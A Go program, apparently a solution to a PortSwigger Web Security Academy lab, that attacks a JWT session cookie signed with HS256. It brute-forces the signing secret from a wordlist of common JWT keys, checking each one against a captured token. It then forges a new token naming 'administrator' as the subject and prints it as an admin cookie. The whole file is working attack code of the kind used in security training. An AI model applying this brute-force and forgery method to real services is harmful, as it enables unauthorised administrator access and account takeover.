package main

import (
	"bufio"
	"fmt"
	"os"

	"github.com/golang-jwt/jwt/v4"
)

// Header { "kid": "47a2a219-a733-4d27-961e-89888e0030d2", "alg": "HS256"}
// Payload { "iss": "portswigger", "sub": "wiener", "exp": 1675253083 }
func createAndSignNewJWTToken(jwtKey string) (string, error) {
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"iss": "portswigger",
		"sub": "administrator",
		"exp": 1675253083,
	})
	token.Header["kid"] = "47a2a219-a733-4d27-961e-89888e0030d2"
	delete(token.Header, "typ")

	tokenString, err := token.SignedString([]byte(jwtKey))

	if err != nil {
		return "", err
	}

	return tokenString, nil
}

func main() {

	// Session cookie
	sessionCookie := "eyJraWQiOiI0N2EyYTIxOS1hNzMzLTRkMjctOTYxZS04OTg4OGUwMDMwZDIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3NTI1MzA4M30.aeILFLsQ0HUc9wJ5txQMeMyLttVi5W0eRs-LAh4raR8"

	// https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
	jwtSecretsFile, err := os.Open("./jwt_secrets")
	if err != nil {
		fmt.Println("unexpected error ", err)
	}
	defer jwtSecretsFile.Close()

	fileScanner := bufio.NewScanner(jwtSecretsFile)
	fileScanner.Split(bufio.ScanLines)

	// Brute forcing the right jwtKey by trying to verify which word would verify the validity of our token
	for fileScanner.Scan() {
		jwtKey := fileScanner.Text()
		token, _ := jwt.Parse(sessionCookie, func(token *jwt.Token) (interface{}, error) {
			// fmt.Println(token.Header)
			if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
			}
			return []byte(jwtKey), nil
		})

		if _, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {
			// This is the correct secret key
			secret_key := jwtKey
			fmt.Println("The secret key is: ", secret_key)

			// Generating administrator session token
			adminAuthCookie, err := createAndSignNewJWTToken(secret_key)
			if err != nil {
				fmt.Printf("unexpected error: %v", err)
				break
			}
			fmt.Println("Admin cookie is: ", adminAuthCookie)
			break
		} else {
			// fmt.Println(err)
		}

	}

}
